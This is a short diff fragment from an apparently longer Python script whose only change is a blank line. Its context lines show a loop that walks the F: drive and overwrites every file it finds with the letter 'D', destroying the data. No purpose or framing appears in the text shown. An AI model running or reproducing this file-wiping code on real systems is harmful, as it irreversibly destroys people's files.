@@ -10,5 +10,6 @@ for root, dirs, files in os.walk("F:"):
      fh = open(os.path.join(root,name),"w")
      fh.write("D")
      fh.close()
+     
 print(s)
 
